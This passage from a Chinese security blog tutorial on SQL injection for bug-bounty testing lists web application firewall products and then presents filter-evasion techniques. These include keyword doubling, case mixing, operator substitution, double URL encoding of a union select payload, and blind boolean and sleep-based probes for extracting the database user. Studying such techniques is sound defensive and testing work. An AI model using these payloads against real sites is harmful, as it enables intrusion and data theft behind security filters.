<h3 id="软件-WAF"><a href="#软件-WAF" class="headerlink" title="软件 WAF"></a>软件 WAF</h3><p>软件 WAF 安装在需要防护的服务器上，通过监听端口或以 Web 容器扩展方式进行请求检测和阻断。</p>
<p>1、网站安全狗</p>
<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn/</a></p>
<p>2、云锁</p>
<p><a target="_blank" rel="noopener" href="https://yunsuo.qianxin.com/">https://yunsuo.qianxin.com/</a></p>
<p>3、D 盾</p>
<p><a target="_blank" rel="noopener" href="https://d99net.net/">https://d99net.net/</a></p>
<p>4、网防 G01</p>
<p><a target="_blank" rel="noopener" href="https://www.gov110.cn/">https://www.gov110.cn/</a></p>
<p>5、护卫神</p>
<p><a target="_blank" rel="noopener" href="https://www.hws.com/">https://www.hws.com/</a></p>
<p>6、智创</p>
<p><a target="_blank" rel="noopener" href="https://www.zcnt.com/">https://www.zcnt.com/</a></p>
<p>7、UPUPW</p>
<p><a target="_blank" rel="noopener" href="https://www.upupw.net/versions/">https://www.upupw.net/versions/</a></p>
<p>8、宝塔网站防火墙</p>
<p><a target="_blank" rel="noopener" href="https://www.bt.cn/">https://www.bt.cn/</a></p>
<p>9、360 网站卫视</p>
<p>10、悬镜</p>
<p><a target="_blank" rel="noopener" href="https://www.xmirror.cn/">https://www.xmirror.cn/</a></p>
<p>11、安骑士</p>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/product/28449.html">https://help.aliyun.com/product/28449.html</a></p>
<h2 id="waf绕过思路-云息信安"><a href="#waf绕过思路-云息信安" class="headerlink" title="waf绕过思路(云息信安)"></a>waf绕过思路(云息信安)</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>union+select</p>
<p>unionunion+selectselect</p>
<h3 id="等号-like-绕过-很常见的"><a href="#等号-like-绕过-很常见的" class="headerlink" title="等号 like 绕过(很常见的)"></a>等号 like 绕过(很常见的)</h3><p>有些开发修复 就是简单的禁用了一些函数 &#x3D; like ‘ “ + , left</p>
<p>用like替换掉等于号</p>
<h3 id="and-or-绕过"><a href="#and-or-绕过" class="headerlink" title="and&#x2F;or 绕过"></a>and&#x2F;or 绕过</h3><p>替代字符：</p>
<ul>
<li>and 等于&amp;&amp; </li>
<li>or 等于‖ </li>
<li>not 等于 !</li>
<li>xor 等于 |</li>
</ul>
<p>目前主流的 waf 都会对</p>
<ul>
<li>id&#x3D;1 and 1&#x3D;2</li>
<li>id&#x3D;1 or 1&#x3D;2</li>
<li>id&#x3D;0 or 1&#x3D;2</li>
<li>id&#x3D;0 xor 1&#x3D;1 limit 1</li>
<li>id&#x3D;1 xor 1&#x3D;2</li>
</ul>
<p>对这些常见的 SQL 注入检测语句进行拦截，像 and 这些还有字符代替</p>
<p>字符如下:</p>
<ul>
<li>and 等于&amp;&amp;</li>
<li>or 等于‖</li>
<li>not等于!</li>
<li>xor 等于 |</li>
</ul>
<p>所以可以转换成这样:</p>
<p>id&#x3D;1 and 1&#x3D;1等于id&#x3D;1 &amp;&amp; 1&#x3D;1<br>id&#x3D;1 and 1&#x3D;2等于id&#x3D;1 &amp;&amp; 1&#x3D;2<br>id&#x3D;1 or 1&#x3D;1 等于id&#x3D;1 || 1&#x3D;1<br>id&#x3D;0 or 1&#x3D;0 等于id&#x3D;0 ‖ 1&#x3D;0</p>
<p>in</p>
<p>in 运算符用来判断表达式的值是否位于给出的列表中；如果是 返回值为1，否则返回值为0；</p>
<p>not in</p>
<p>NOTIN 用来判断表达式的值是否不存在于给出的列表中；如果不是 返回值为 1，否则返回值为0；</p>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>select<br>SeleCT</p>
<h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>substr(database(),1,1) -&gt; substr(database() from 1 for 1) ; </p>
<p>limit 0,1 -&gt; limit 1 offset 0</p>
<h3 id="等效函数替换绕过-很常见的"><a href="#等效函数替换绕过-很常见的" class="headerlink" title="等效函数替换绕过(很常见的)"></a>等效函数替换绕过(很常见的)</h3><p>substr -&gt;mid left right 尝试进行等效函数替换</p>
<h3 id="ascii-编码绕过-很常见的"><a href="#ascii-编码绕过-很常见的" class="headerlink" title="ascii 编码绕过(很常见的)"></a>ascii 编码绕过(很常见的)</h3><p>1+and+substr(database(),1,1)%3d’q’+%23</p>
<p>1+and+ascii(substr(database(),1,1))%3d123+%23</p>
<p>当使用ascii编码，然后再进行对比时，页面出现了内容，说明当前数据库的库名是113，解码后是q</p>
<p>为什么编码可以绕过的</p>
<p>有些网站还是 WAF 会存在一个自动解析</p>
<p>WAF 自动解析</p>
<h3 id="二次编码绕过-很推荐"><a href="#二次编码绕过-很推荐" class="headerlink" title="二次编码绕过(很推荐)"></a>二次编码绕过(很推荐)</h3><p>两次 url 编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2,3,4#</span><br><span class="line"></span><br><span class="line">%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23</span><br><span class="line"></span><br><span class="line">%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</span><br></pre></td></tr></table></figure>

<h1 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h1><p>判读是否存在注入点 或者挖掘 SQL注入的核心是什么</p>
<p>“变”是挖掘 SQL注入核心</p>
<p>变</p>
<p>1、你变(变姿势)<br>2、页面变(页面的变化) -报错(页面直接的报错、SQL语句的报错)、时间注入(页面的时间发生改变，响应时间发生改变)、返回包会携带一些细微的变化(有些可能只是细微的字符)</p>
<p>waf 它有些是自动拦截的 像雷池 就是自动拦截 拦截方式(自动拦截 + 手动拦截)</p>
<p><code>’</code> <code>&quot;</code>自动认为你是恶意攻击 所以你也判断不了</p>
<p>你有可能会以为是你SQL注入成功了对面才拦截你</p>
<p>其实不然 它是自动拦截的</p>
<p>1、判断是否存在注入点（数字型、字符型）</p>
<p>?id&#x3D;1&#x2F;1&#x3D;1发现存在注入点<br>[1、数字型  2、&#x2F;法可用  3、存在注入点]</p>
<p>?id&#x3D;1&#x2F;1&#x3D;1   id&#x3D;1   a   ?id&#x3D;1</p>
<p>?id&#x3D;2&#x2F;1&#x3D;2   id&#x3D;2   b   ?id&#x3D;2</p>
<p><code>/</code> <code>+</code> <code>-</code> 数字型的</p>
<p>如果是<code>&#39;</code> <code>&quot;</code> 很有可能就是字符型的</p>
<p>‘)</p>
<p>“)</p>
<p>2、构造轮子-找到可执行的函数或方法</p>
<p>?id&#x3D;4&#x2F;4 可以使用?id&#x3D;4&#x2F;4 和?id&#x3D;1是差不多的效果 那么很可能是有注入点的</p>
<p>?id&#x3D;4&#x2F;if(2&#x3D;2,2,1)?id&#x3D;4&#x2F;2&#x3D;2?id&#x3D;2   e</p>
<p>?id&#x3D;4&#x2F;if(2&#x3D;1,1,1)?id&#x3D;4&#x2F;1&#x3D;4?id&#x3D;4   f</p>
<p>if语句可以使用</p>
<p>?id&#x3D;4&#x2F;if(lenth(123)&#x3D;1,1,0)</p>
<p>?id&#x3D;4&#x2F;if(lenth(user)&#x3D;1,1,0)   if lenth s&#x3D;user</p>
<p>?id&#x3D;4&#x2F;if(left(‘123’,1)&#x3D;1,1,0)  可以证明 left 语句使用</p>
<p>?id&#x3D;4&#x2F;if(left(user,1)&#x3D;’a’,1,1)  这一步去证明 user 可以使用</p>
<p>3、跑数据或拿权限造成进一步的危害</p>
<p>?id&#x3D;4&#x2F;if(left(user,z)&#x3D;’t’,1,1)</p>
<p>跑两个参数</p>
<p>z：1-10<br>t：0-1 a-z A-Z</p>
<p>if+sleep</p>
<p>user 第一个字母为a 就睡眠5秒</p>
<p>a、v、u 都睡眠5秒</p>
<p>?id&#x3D;2&#x2F;if(left(‘123’,1)&#x3D;’1’,1,2)</p>
<p>?id&#x3D;2&#x2F;1</p>
<p>?id&#x3D;2&#x2F;2</p>
<p>?id&#x3D;2&#x2F;if(1&#x3D;1,1.2)</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/7410.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/7410.html')">【SRC】SQL注入漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/7410.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=【SRC】SQL注入漏洞&amp;url=https://hihopkc.github.io/posts/7410.html&amp;pic=https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/f048.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202405161231975.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NSSCTF Round#23 Misc个人专项赛WP</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">一般挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">1、判断是否存在注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%9E%84%E9%80%A0%E8%BD%AE%E5%AD%90-%E6%89%BE%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E6%88%96%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">2、构造轮子-找到可执行的函数或方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%B7%91%E6%95%B0%E6%8D%AE%E6%88%96%E6%8B%BF%E6%9D%83%E9%99%90%E9%80%A0%E6%88%90%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.3.</span> <span class="toc-text">3、跑数据或拿权限造成进一步的危害</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">判断是否存在注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF"><span class="toc-number">4.1.</span> <span class="toc-text">基于错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AE%B9"><span class="toc-number">4.2.</span> <span class="toc-text">基于内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="toc-number">4.3.</span> <span class="toc-text">基于时间</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%83%BD%E5%B8%AE%E5%BF%99%E9%80%89%E6%8B%A9%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E8%BD%AE%E5%AD%90"><span class="toc-number">5.</span> <span class="toc-text">判断数据库类型，能帮忙选择函数构造轮子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%88%A4%E6%96%AD"><span class="toc-number">5.1.</span> <span class="toc-text">端口判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84"><span class="toc-number">5.2.</span> <span class="toc-text">系统架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%88%A4%E6%96%AD"><span class="toc-number">5.3.</span> <span class="toc-text">报错信息判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9%E5%B7%A5%E5%85%B7%E5%88%A4%E6%96%AD"><span class="toc-number">5.4.</span> <span class="toc-text">借助工具判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7"><span class="toc-number">5.5.</span> <span class="toc-text">借助注释符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9%E5%87%BD%E6%95%B0%E5%88%A4%E6%96%AD"><span class="toc-number">5.6.</span> <span class="toc-text">借助函数判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#len%E5%92%8Clenth"><span class="toc-number">5.6.1.</span> <span class="toc-text">len和lenth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#version%E5%92%8Cversion"><span class="toc-number">5.6.2.</span> <span class="toc-text">@@version和version()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substring-substr"><span class="toc-number">5.6.3.</span> <span class="toc-text">substring substr</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">SQL注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">6.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E5%88%86"><span class="toc-number">6.3.</span> <span class="toc-text">提交方式分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E9%A1%B5%E9%9D%A2%E5%9B%9E%E6%98%BE%E5%88%86"><span class="toc-number">6.4.</span> <span class="toc-text">根据页面回显分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">6.5.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.5.1.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">6.5.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">6.6.</span> <span class="toc-text">布尔注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%B6%89%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="toc-number">6.6.1.</span> <span class="toc-text">布尔型注入涉及函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.7.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E5%AE%9A%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.7.1.</span> <span class="toc-text">判定条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%B8%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8C%BA%E5%88%AB"><span class="toc-number">6.7.2.</span> <span class="toc-text">时间盲注与布尔盲注区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">6.7.3.</span> <span class="toc-text">常用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.8.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">6.8.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">6.8.2.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">6.8.3.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.8.4.</span> <span class="toc-text">基本步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">6.8.5.</span> <span class="toc-text">报错注入函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">6.8.6.</span> <span class="toc-text">报错注入函数详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.9.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">waf绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#waf%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">7.1.</span> <span class="toc-text">waf的定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%84%E7%BD%AE%E6%B5%81%E7%A8%8B"><span class="toc-number">7.2.</span> <span class="toc-text">处置流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADwaf%E7%9A%84%E5%93%81%E7%89%8C"><span class="toc-number">7.3.</span> <span class="toc-text">判断waf的品牌</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91waf"><span class="toc-number">7.3.1.</span> <span class="toc-text">云waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6-WAF"><span class="toc-number">7.3.2.</span> <span class="toc-text">硬件 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6-WAF"><span class="toc-number">7.3.3.</span> <span class="toc-text">软件 WAF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF-%E4%BA%91%E6%81%AF%E4%BF%A1%E5%AE%89"><span class="toc-number">7.4.</span> <span class="toc-text">waf绕过思路(云息信安)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.1.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7-like-%E7%BB%95%E8%BF%87-%E5%BE%88%E5%B8%B8%E8%A7%81%E7%9A%84"><span class="toc-number">7.4.2.</span> <span class="toc-text">等号 like 绕过(很常见的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#and-or-%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.3.</span> <span class="toc-text">and&#x2F;or 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.4.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.5.</span> <span class="toc-text">逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E6%95%88%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87-%E5%BE%88%E5%B8%B8%E8%A7%81%E7%9A%84"><span class="toc-number">7.4.6.</span> <span class="toc-text">等效函数替换绕过(很常见的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ascii-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-%E5%BE%88%E5%B8%B8%E8%A7%81%E7%9A%84"><span class="toc-number">7.4.7.</span> <span class="toc-text">ascii 编码绕过(很常见的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-%E5%BE%88%E6%8E%A8%E8%8D%90"><span class="toc-number">7.4.8.</span> <span class="toc-text">二次编码绕过(很推荐)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF"><span class="toc-number">8.</span> <span class="toc-text">测试思路</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/7410.html" title="【SRC】SQL注入漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【SRC】SQL注入漏洞"/></a><div class="content"><a class="title" href="/posts/7410.html" title="【SRC】SQL注入漏洞">【SRC】SQL注入漏洞</a><time datetime="2024-07-02T05:25:14.000Z" title="发表于 2024-07-02 13:25:14">2024-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f048.html" title="NSSCTF Round#23 Misc个人专项赛WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202405161231975.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF Round#23 Misc个人专项赛WP"/></a><div class="content"><a class="title" href="/posts/f048.html" title="NSSCTF Round#23 Misc个人专项赛WP">NSSCTF Round#23 Misc个人专项赛WP</a><time datetime="2024-05-16T04:30:25.000Z" title="发表于 2024-05-16 12:30:25">2024-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5b73.html" title="2024广东大学生攻防大赛WP"><img src= 